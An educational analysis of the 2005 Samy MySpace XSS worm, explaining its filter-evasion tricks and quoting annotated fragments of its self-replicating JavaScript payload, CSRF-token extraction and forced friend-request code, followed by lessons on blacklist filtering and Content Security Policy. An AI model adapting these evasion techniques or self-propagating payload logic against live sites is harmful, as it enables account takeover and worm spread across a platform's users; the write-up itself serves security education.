# 09 - The Samy Worm (MySpace XSS Worm, 2005)

## Background

The Samy worm was created by Samy Kamkar in October 2005. It became the fastest-spreading virus of all time, infecting over one million MySpace profiles in under 20 hours. It was a stored XSS worm — it replicated by injecting itself into every profile that viewed an infected page.

The payload was relatively benign: it added "but most of all, samy is my hero" to the victim's Heroes section and sent a friend request to Samy's account (friendID 11851658).

## How It Bypassed MySpace's Filters

MySpace stripped `<script>` tags and common event handlers, but the worm used several evasion techniques:

### 1. CSS Expression for Code Execution

```html
<div id=mycode style="BACKGROUND: url('javascript:eval(document.all.mycode.expr)')"
     expr="...payload here...">
</div>
```

MySpace blocked `<script>` but allowed inline CSS. IE supported `javascript:` URLs in CSS `url()` values, and the `expr` attribute stored the actual payload. The CSS expression evaluated the code stored in the div's custom attribute.

### 2. String Splitting to Evade Keyword Filters

```javascript
eval('document.body.inne' + 'rHTML')
```

MySpace filtered keywords like `innerHTML`. By splitting the string and concatenating at runtime, the filter saw `inne` and `rHTML` separately — neither matched the blacklist.

Similarly:
```javascript
eval('J.onr' + 'eadystatechange=BI');  // avoids "onreadystatechange" filter
```

### 3. Encoding Tricks

```javascript
var B = String.fromCharCode(34);  // double quote "
var A = String.fromCharCode(39);  // single quote '
```

Quotes were generated at runtime to avoid breaking out of attribute contexts or triggering filters.

## The Worm's Attack Flow

### Step 1: Extract Tokens from the Page

```javascript
function getQueryParams() {
  var E = document.location.search;
  var F = E.substring(1, E.length).split('&');
  var AS = new Array();
  for (var O = 0; O < F.length; O++) {
    var I = F[O].split('=');
    AS[I[0]] = I[1];
  }
  return AS;
}

var AS = getQueryParams();
var L = AS['Mytoken'];   // CSRF token
var M = AS['friendID'];  // victim's profile ID
```

The worm grabbed `Mytoken` (MySpace's CSRF token) and `friendID` from the URL — everything needed to make authenticated requests on behalf of the victim.

### Step 2: Read the Victim's Profile (XMLHttpRequest)

```javascript
function getXMLObj() {
  var Z = false;
  if (window.XMLHttpRequest) {
    try { Z = new XMLHttpRequest() } catch(e) { Z = false }
  } else if (window.ActiveXObject) {
    try { Z = new ActiveXObject('Msxml2.XMLHTTP') } catch(e) {
      try { Z = new ActiveXObject('Microsoft.XMLHTTP') } catch(e) { Z = false }
    }
  }
  return Z;
}
```

Standard 2005-era cross-browser XMLHttpRequest creation, with IE ActiveX fallbacks.

### Step 3: Self-Replicate into the Heroes Section

```javascript
function getHome() {
  var AU = J.responseText;
  AG = findIn(AU, 'ProfileHeroes', '</td>');
  AG = AG.substring(61, AG.length);

  if (AG.indexOf('samy') == -1) {  // not already infected
    if (AF) {
      AG += AF;  // append worm payload to Heroes section
      var AR = getFromURL(AU, 'Mytoken');
      var AS = new Array();
      AS['interestLabel'] = 'heroes';
      AS['submit'] = 'Preview';
      AS['interest'] = AG;
      J = getXMLObj();
      httpSend('/index.cfm?fuseaction=profile.previewInterests&Mytoken=' + AR,
               postHero, 'POST', paramsToString(AS));
    }
  }
}
```

The worm:
1. Fetches the victim's profile page
2. Extracts the current Heroes content
3. Checks if already infected (`samy` not found)
4. Appends the worm payload: `"but most of all, samy is my hero."` plus the self-replicating div
5. Submits via MySpace's profile edit form (Preview → Submit, two-step process)

### Step 4: Self-Propagation Code

The worm copies its own source from the DOM:

```javascript
var AA = g();                              // get page HTML
var AB = AA.indexOf('mycode');             // find the worm div
var AC = AA.substring(AB, AB + 4096);     // extract ~4KB of worm code
var AD = AC.indexOf('DIV');               // find the closing tag
var AE = AC.substring(0, AD);            // isolate the payload

// Re-encode to survive being written into a new profile
AE = AE.replace('java', "'" + 'java');
AE = AE.replace('expr)', 'expr)' + "'");

AF = ' but most of all, samy is my hero. <div id=' + AE + 'DIV>';
```

This is the self-replication mechanism — it reads its own code from the DOM, patches the quotes for the new context, and prepares it for injection into the next victim's profile.

### Step 5: Force-Add Samy as a Friend

```javascript
function main() {
  var AN = getClientFID();
  var BH = '/index.cfm?fuseaction=user.viewProfile&friendID=' + AN + '&Mytoken=' + L;
  J = getXMLObj();
  httpSend(BH, getHome, 'GET');

  xmlhttp2 = getXMLObj();
  httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&friendID=11851658&Mytoken=' + L,
            processxForm, 'GET');
}

function processxForm() {
  var AU = xmlhttp2.responseText;
  var AQ = getHiddenParameter(AU, 'hashcode');
  var AR = getFromURL(AU, 'Mytoken');
  var AS = new Array();
  AS['hashcode'] = AQ;
  AS['friendID'] = '11851658';       // Samy's account
  AS['submit'] = 'Add to Friends';
  httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&Mytoken=' + AR,
            nothing, 'POST', paramsToString(AS));
}
```

Two parallel operations: infect the profile (via `getHome`) and send a friend request to Samy's account (via `processxForm`). The friend request flow extracts the `hashcode` anti-CSRF token from the verification page, then submits the form.

## Key Techniques Summary

| Technique | Purpose |
|---|---|
| CSS `url('javascript:...')` | Execute JS without `<script>` tags |
| Custom HTML attributes (`expr`) | Store payload outside filtered contexts |
| String concatenation (`'inne'+'rHTML'`) | Bypass keyword blacklists |
| `String.fromCharCode()` | Generate quotes without literal quote characters |
| DOM self-reading (`innerHTML`) | Self-replication — copy own source code |
| Two XMLHttpRequest objects | Parallel requests for infection + friend-add |
| Token extraction from page HTML | Defeat CSRF protections |

## Lessons

- Blacklist-based XSS filtering is fundamentally fragile — there are too many execution contexts (CSS expressions, event handlers, protocol handlers) to block them all
- The worm demonstrated that XSS + AJAX = self-propagating malware. A single stored XSS vulnerability can compromise an entire platform
- MySpace's two-step form submission (Preview → Submit) didn't help because the worm automated both steps
- CSRF tokens were useless because the worm ran in the same origin and could read them from the page
- This incident was a major catalyst for the industry adopting Content Security Policy (CSP) and moving toward whitelist-based sanitization
